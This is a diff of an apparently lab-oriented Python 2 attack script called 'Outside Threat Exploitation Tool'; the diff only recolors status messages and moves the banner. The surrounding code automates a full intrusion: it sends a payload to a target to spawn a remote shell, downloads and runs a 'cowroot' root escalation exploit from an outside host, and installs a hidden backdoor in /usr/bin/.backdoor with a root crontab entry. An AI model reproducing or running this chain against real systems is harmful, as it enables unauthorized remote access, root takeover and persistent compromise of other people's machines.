@@ -9,17 +9,16 @@ HOST = "10.10.1.5"
 PORT = 80
 SIZE = 1024
 
-print "####################################"
-print "##Outside Threat Exploitation Tool##"
-print "####################################"
+OK_PLUS = '\033[92m+\033[0m'
+NOK_MINUS = '\033[93m\-\033[0m'
 
 def SpawnShell():
-	print "[+] starting listener"
+	print "[" + OK_PLUS + "] starting listener"
         child = pexpect.spawn("./listen.sh")
         child.expect("listening")
         child.sendcontrol("c")
         time.sleep(2)
-        print "[+] listener successfully started"
+        print "[" + OK_PLUS + "] listener successfully started"
 
         # Building a socket to send the raw data in
         # payload file in this directory, then sending it
@@ -31,7 +30,7 @@ def SpawnShell():
                 s.send(l)
                 l = f.read(SIZE)
         f.close()
-        print "[+] payload send"
+        print "[" + OK_PLUS + "] payload send"
         time.sleep(30)
 
         child.expect("connect")
@@ -45,35 +44,35 @@ def SpawnShell():
 
 def EscalateToRoot():
         SendToPipe("cd /tmp")
-        print "[+] downloading root escalation script"
+        print "[" + OK_PLUS + "] downloading root escalation script"
         SendToPipe("wget http://10.10.2.100/cowroot", 1, 5)
         SendToPipe("ls -l")
         CheckOutFile("saved [11384/11384]")
         SendToPipe("chmod 700 cowroot")
-        print "[+] executing escalation script"
+        print "[" + OK_PLUS + "] executing escalation script"
         SendToPipe("./cowroot", 1, 5)
         SendToPipe("id", 1, 3)
         CheckOutFile("uid=0(root)")
-        print "[+] w00tw00t we are r00t"
+        print "[" + OK_PLUS + "] w00tw00t we are r00t"
 
 def CreateBackdoor():
-        print "[+] downloading backdoor"
+        print "[" + OK_PLUS + "] downloading backdoor"
         SendToPipe("cd /usr/bin")
         SendToPipe("mkdir .backdoor")
         SendToPipe("cd .backdoor")
         SendToPipe("wget http://10.10.2.100/hello.sh", 1, 5)
         CheckOutFile("saved [459/459]")
-        print "[+] installing backdoor"
+        print "[" + OK_PLUS + "] installing backdoor"
         SendToPipe("chmod 700 hello.sh")
         SendToPipe("wget http://10.10.2.100/install.sh", 1, 5)
         CheckOutFile("saved [81/81]")
         SendToPipe("chmod 700 install.sh")
         SendToPipe("bash install.sh")
         SendToPipe("rm install.sh")
-        print "[+] checking for backdoor"
+        print "[" + OK_PLUS + "] checking for backdoor"
         SendToPipe("tail -n5 /etc/crontab")
         CheckOutFile("* * * root /usr/bin/.backdoor/hello.sh")
-        print "[+] successfully installed backdoor"
+        print "[" + OK_PLUS + "] successfully installed backdoor"
         
 
 # This function sends the command to the named pipe an x number
@@ -88,11 +87,14 @@ def SendToPipe(command, repeats = 1, sleeptime = 1):
 # if this check fails the application will exit.
 def CheckOutFile(checkval):
         if checkval in open("out.txt").read():
-                print "[+] OK - " + checkval
+                print "[" + OK_PLUS + "] OK - " + checkval
         else:
-                print "[-] NOK - " + checkval
+                print "[" + NOK_MINUS + "] NOK - " + checkval
                 exit(1)
 
+print "####################################"
+print "##Outside Threat Exploitation Tool##"
+print "####################################"
 print "++++ Menu ++++"
 print "[1] start fragmentation and exploit the target"
 print "[2] exit the script"
